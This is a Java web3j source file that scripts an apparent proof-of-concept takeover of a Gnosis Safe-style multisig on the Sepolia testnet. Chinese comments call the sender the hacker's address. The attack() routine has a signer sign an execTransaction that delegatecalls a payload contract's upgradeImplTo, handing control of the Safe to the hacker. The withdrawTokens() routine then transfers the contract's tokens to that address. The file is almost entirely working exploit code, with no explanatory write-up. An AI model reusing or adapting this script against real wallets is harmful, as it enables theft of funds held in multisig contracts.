package com.tc.test;

import org.apache.commons.lang3.StringUtils;
import org.web3j.abi.FunctionEncoder;
import org.web3j.abi.datatypes.*;
import org.web3j.abi.datatypes.generated.Uint256;
import org.web3j.abi.datatypes.generated.Uint8;
import org.web3j.crypto.*;
import org.web3j.protocol.Web3j;
import org.web3j.protocol.core.DefaultBlockParameterName;
import org.web3j.protocol.http.HttpService;
import org.web3j.utils.Numeric;

import java.math.BigInteger;
import java.util.*;

import static com.tc.test.Web3Util.*;

//TIP To <b>Run</b> code, press <shortcut actionId="Run"/> or
// click the <icon src="AllIcons.Actions.Execute"/> icon in the gutter.
public class Main {

    // safe without guard
    static String safeContractAddress = "0xfd73fc22e1b64dDe28B8c055FffDC79Be8180F49";
    // safe with guarda
//    static String safeContractAddress = "0xEbf288a3C20C2551d42481242D0cA1D8826D20d6";

    static String payloadContractAddress = "0xE03aA9F507B91164Cc044A33796f3A5146463a6c";
    static String signerAddress = "0xe5a7b0c16127f81530352bdce6d5a6c7b07db4ec";
    static String tokenAddress = "0x92cab42fa3f3b63c5f5f2e1ad3334ef927a9588f"; // mock usdc

    static long chainId = 11155111L;

    // sender直接理解为黑客地址
    static String hackerAddress = "0xcecCbBD9bCa111A2F794D78dD58c6470450a6716";
    static BigInteger baseFeeEstimated = new BigInteger("30000000000"); // 30Gwei


    public static void main(String[] args) throws Exception {

        // 执行攻击
        attack();

        // 提取资金
//        withdrawTokens();
    }

    public static void withdrawTokens() throws Exception {

        // load 私钥
        Map<String, String> privateKeyPairs = loadPrivateKeyPairsFromLocalFile();

        // load rpc url
        Web3j web3j = Web3j.build(new HttpService(loadHttpRpcUrlFromLocalFile().get(chainId).get(0)));

        // 构造calldata
        BigInteger transferAmount = new BigInteger("12345");
        String callData = buildPayloadTransferCallData(hackerAddress, tokenAddress, transferAmount);

        //
        final BigInteger maxTipFee = web3j.ethMaxPriorityFeePerGas().send().getMaxPriorityFeePerGas();
        final BigInteger maxFee = maxTipFee.add(baseFeeEstimated);

        // 构造payload交易
        RawTransaction payloadTx = RawTransaction.createTransaction(
                chainId,
                web3j.ethGetTransactionCount(hackerAddress, DefaultBlockParameterName.LATEST).send().getTransactionCount(),
                BigInteger.valueOf(300000),
                safeContractAddress,
                BigInteger.ZERO,
                callData,
                maxTipFee,
                maxFee
        );

        // 签名payload交易
        String signedTransaction = signRawTransaction(privateKeyPairs, hackerAddress, payloadTx);

        // 发送交易
        String txHashSent = web3j.ethSendRawTransaction(signedTransaction).send().getTransactionHash();
        System.out.println(txHashSent);
    }

    private static String buildPayloadTransferCallData(String hackerAddress, String tokenAddress, BigInteger amount) {
        // 构造input param
        List<Type> inputParameters = new ArrayList<>();
        inputParameters.add(new Address(tokenAddress));
        inputParameters.add(new Address(hackerAddress));
        inputParameters.add(new Uint256(amount));
        // 构造function数据
        Function function = new Function("transferOut", inputParameters, Collections.emptyList());
        return FunctionEncoder.encode(function);
    }

    public static void attack() throws Exception  {

        // load 私钥
        Map<String, String> privateKeyPairs = loadPrivateKeyPairsFromLocalFile();

        // load rpc url
        Web3j web3j = Web3j.build(new HttpService(loadHttpRpcUrlFromLocalFile().get(chainId).get(0)));

        // callData -> delegateCall攻击合约的upgradeImplTo方法
        String attackSafeTxHashCallData = buildAttackSafeTxHashCallData(payloadContractAddress, hackerAddress);
        // 构造交易
        String safeTxHash = buildSafeTxHashByContractInteract(web3j, payloadContractAddress, BigInteger.ZERO, attackSafeTxHashCallData, safeContractAddress);
        System.out.println("safeTxHash: " + safeTxHash);

        // 签名交易 personalSign需要(v + 4)
        String signature = signSafeTxHash(privateKeyPairs, signerAddress, safeTxHash);

        // 得到payload交易的callData
        String callData = buildPayloadTxCallData(signature, payloadContractAddress, attackSafeTxHashCallData);

        final BigInteger maxTipFee = web3j.ethMaxPriorityFeePerGas().send().getMaxPriorityFeePerGas();
        final BigInteger maxFee = maxTipFee.add(baseFeeEstimated);

        // 构造payload交易
        RawTransaction payloadTx = RawTransaction.createTransaction(
                chainId,
                web3j.ethGetTransactionCount(hackerAddress, DefaultBlockParameterName.LATEST).send().getTransactionCount(),
                BigInteger.valueOf(300000),
                safeContractAddress,
                BigInteger.ZERO,
                callData,
                maxTipFee,
                maxFee
        );

        // 签名payload交易
        String signedTransaction = signRawTransaction(privateKeyPairs, hackerAddress, payloadTx);

        // 发送交易
        String txHashSent = web3j.ethSendRawTransaction(signedTransaction).send().getTransactionHash();
        System.out.println(txHashSent);
    }

    private static String signSafeTxHash(Map<String, String> privateKeyPairs, String signerAddress, String safeTxHash) {
        String signature = signByCredentials(Credentials.create(privateKeyPairs.get(signerAddress)), safeTxHash, false);

        byte[] signatureBytes = Numeric.hexStringToByteArray(signature);

        return Numeric.toHexString(signatureBytes);
    }

    private static String buildAttackSafeTxHashCallData(String payloadContractAddress, String ownerAddress) {
        // 构造input param
        List<Type> inputParameters = new ArrayList<>();
        inputParameters.add(new Address(payloadContractAddress));
        inputParameters.add(new Address(ownerAddress));
        // 构造function数据
        Function function = new Function("upgradeImplTo", inputParameters, Collections.emptyList());
        return FunctionEncoder.encode(function);
    }

    private static String buildPayloadTxCallData(String signature, String toAddress, String callData) {

        // 拼接所有的eoa签名（不改成approved等操作）—— 实际生产中有signer顺序问题
        String signatures = Numeric.prependHexPrefix(StringUtils.lowerCase(signature));

        // 构造input param
        List<Type> inputParameters = new ArrayList<>();
        inputParameters.add(new Address(toAddress));
        inputParameters.add(new Uint256(BigInteger.ZERO));
        inputParameters.add(new DynamicBytes(Numeric.hexStringToByteArray(callData)));
        // delegate call
        inputParameters.add(new Uint8(1));
        inputParameters.add(new Uint256(0));
        inputParameters.add(new Uint256(0));
        inputParameters.add(new Uint256(0));
        inputParameters.add(new Address("0x0000000000000000000000000000000000000000"));
        inputParameters.add(new Address("0x0000000000000000000000000000000000000000"));
        inputParameters.add(new DynamicBytes(Numeric.hexStringToByteArray(signatures)));
        // 构造function数据
        Function function = new Function("execTransaction", inputParameters, Collections.emptyList());
        return FunctionEncoder.encode(function);
    }
}